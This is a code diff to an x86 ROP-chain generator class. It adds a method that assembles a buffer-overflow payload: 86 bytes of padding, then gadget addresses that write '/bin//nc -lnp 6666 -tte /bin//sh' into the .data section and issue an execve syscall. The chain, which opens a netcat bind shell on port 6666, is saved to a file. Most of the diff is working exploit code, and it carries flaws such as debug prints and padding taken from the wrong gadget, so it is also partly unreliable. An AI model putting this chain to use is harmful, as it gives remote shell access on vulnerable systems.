@@ -8,7 +8,8 @@
 ##
 
 import re
-
+import sys
+from struct import pack
 
 class ROPMakerX86(object):
     def __init__(self, binary, gadgets, liboffset=0x0):
@@ -70,6 +71,17 @@ class ROPMakerX86(object):
                     print("\tp += pack('<I', 0x%08x) # padding without overwrite %s" % (regAlreadSetted[reg], reg))
                 except KeyError:
                     print("\tp += pack('<I', 0x41414141) # padding")
+
+    def __buffPadding(self, gadget, regAlreadSetted, buff):
+        lg = gadget["gadget"].split(" ; ")
+        for g in lg[1:]:
+            if g.split()[0] == "pop":
+                reg = g.split()[1]
+                try:
+                    buff += pack('<I', regAlreadSetted[reg])
+                except KeyError:
+                    buff += pack('<I', 0x12121212)
+        return buff
 
     def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
 
@@ -141,6 +153,180 @@ class ROPMakerX86(object):
             self.__padding(incEax, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx
 
         print("\tp += pack('<I', 0x%08x) # %s" % (syscall["vaddr"], syscall["gadget"]))
+
+    def __buildExecveRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, padding):
+        """
+        /buffer overflow padding
+
+        write all args into .data
+        write all env vars into .data
+
+        setup list of pointers to arg strings
+        setup list of pointers to env strings
+
+        add 11 to %eax
+        set edx to pointer to env array
+        set ecx to pointer to arg array
+        set ebx to pointer to name of program (args[0])
+
+        call INT80
+        """
+
+
+        filename = "/bin//nc"
+        # [filename, arg1, arg2, ...]
+        args = [filename, '-lnp', '6666', '-tte', '/bin//sh']
+        argPointers = []
+
+        env = []
+        envPointers = []
+
+        sects = self.__binary.getDataSections()
+        dataAddr = None
+        for s in sects:
+            if s["name"] == ".data":
+                dataAddr = s["vaddr"] + self.__liboffset
+        if dataAddr is None:
+            print("\n[-] Error - Can't find a writable section")
+            return
+
+        # Padding
+        buff = bytes('A'*padding, 'ascii')
+
+        # Store args @ .data
+
+        dataOffset = 0
+
+        for arg in args:
+            print(arg)
+            print(dataOffset)
+            argPointers.append(dataAddr + dataOffset)
+            for i in range(0,len(arg), 4):
+                chunk = arg[i:i+4]
+                chunkBytes = bytes(chunk, 'ascii')
+
+                # Force chunk to be full word, otherwise instructions become offset on stack
+                if len(chunk) % 4 != 0:
+                    # for i in range(4 - len(chunk) % 4)
+                    chunkBytes += bytes('\0', 'ascii') * (4 - (len(chunk) % 4))
+
+                print(i)
+                print(chunk)
+                print(chunkBytes.hex())
+
+                buff += pack('<I', popDst["vaddr"])
+                buff += pack('<I', dataAddr + dataOffset)
+                buff = self.__buffPadding(popDst, {}, buff)
+                buff += pack('<I', popSrc["vaddr"])
+                buff += chunkBytes
+                buff = self.__buffPadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + dataOffset}, buff)  # Don't overwrite reg dst
+                buff += pack('<I', write4where["vaddr"])
+                buff = self.__buffPadding(write4where, {}, buff)
+
+                dataOffset += len(chunk)
+
+            # Store terminating char after arg
+            buff += pack('<I', popDst["vaddr"])
+            buff += pack('<I', dataAddr + dataOffset)
+            buff = self.__buffPadding(popDst, {}, buff)
+            buff += pack('<I',xorSrc["vaddr"])
+            buff = self.__buffPadding(xorSrc, {}, buff)
+            buff += pack('<I', write4where["vaddr"])
+            buff = self.__buffPadding(write4where, {}, buff)
+
+            dataOffset += 1
+
+        endOfArgs = dataAddr + dataOffset
+
+        # Create arr of pointers to args
+
+        print("before alignment")
+        print(dataOffset)
+        if dataOffset % 4 != 0:
+            # Align pointer arr
+            dataOffset += 4 - (dataOffset % 4)
+        print("after alignment")
+        print(dataOffset)
+
+        argvArrPointer = dataAddr + dataOffset
+
+        print(argPointers)
+        for pointer in argPointers:
+            buff += pack('<I', popDst["vaddr"])
+            buff += pack('<I', dataAddr + dataOffset)
+            buff = self.__buffPadding(popDst, {}, buff)
+            buff += pack('<I', popSrc["vaddr"])
+            buff += pack('<I', pointer)
+            buff = self.__buffPadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + dataOffset},
+                                      buff)  # Don't overwrite reg dst
+            buff += pack('<I', write4where["vaddr"])
+            buff = self.__buffPadding(write4where, {}, buff)
+
+            dataOffset += 4
+
+        # Create arr of pointers to env
+
+        envpPointer = dataAddr + dataOffset
+
+        if len(envPointers) == 0:
+            print("No envp")
+            # Store Null incase of no args
+            buff += pack('<I', popDst["vaddr"])
+            buff += pack('<I', dataAddr + dataOffset)
+            buff = self.__buffPadding(popDst, {}, buff)
+            buff += pack('<I', xorSrc["vaddr"])
+            buff = self.__buffPadding(xorSrc, {}, buff)
+            buff += pack('<I', write4where["vaddr"])
+            buff = self.__buffPadding(write4where, {}, buff)
+
+            dataOffset += 4
+        else:
+            for pointer in argPointers:
+                buff += pack('<I', popDst["vaddr"])
+                buff += pack('<I', dataAddr + dataOffset)
+                buff = self.__buffPadding(popDst, {}, buff)
+                buff += pack('<I', popSrc["vaddr"])
+                buff += pack('<I', pointer)
+                buff = self.__buffPadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + dataOffset},
+                                          buff)  # Don't overwrite reg dst
+                buff += pack('<I', write4where["vaddr"])
+                buff = self.__buffPadding(write4where, {}, buff)
+
+                dataOffset += 4
+
+        # Execve call setup
+
+        # Set %ebx to pointer to args[0]
+        print("ebx:" + str(dataAddr))
+        buff += pack('<I', popEbx["vaddr"])
+        buff += pack('<I', dataAddr)
+        buff = self.__buffPadding(popEbx, {}, buff)
+
+        # Set %ecx to pointer to argv
+        print("ecx" + str(argvArrPointer))
+        buff += pack('<I', popEcx["vaddr"])
+        buff += pack('<I', argvArrPointer)
+        buff = self.__buffPadding(popEcx, {"ebx":dataAddr}, buff)
+
+        # Set %edx to pointer to env
+        print("edx" + str(envpPointer))
+        buff += pack('<I', popEdx["vaddr"])
+        buff += pack('<I', envpPointer)
+        buff = self.__buffPadding(popEdx, {"ebx":dataAddr, "ecx":dataAddr + 8}, buff)
+
+        # Set %eax to 11 (execve syscall number)
+        buff += pack('<I', xorEax["vaddr"])
+        buff = self.__buffPadding(popEdx, {"ebx":dataAddr, "ecx":dataAddr + 8, "edx":dataAddr + 8}, buff)
+        for _ in range(11):
+            buff += pack('<I', incEax["vaddr"])
+            buff = self.__buffPadding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 8, "edx": dataAddr + 8}, buff)
+
+        # Make syscall
+        buff += pack('<I', syscall["vaddr"])
+
+        outfile = open("execveChain", "wb")
+        outfile.write(buff)
+        outfile.close()
 
     def __generate(self):
 
@@ -217,3 +403,4 @@ class ROPMakerX86(object):
         print("\n- Step 5 -- Build the ROP chain\n")
 
         self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
+        self.__buildExecveRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, 86)
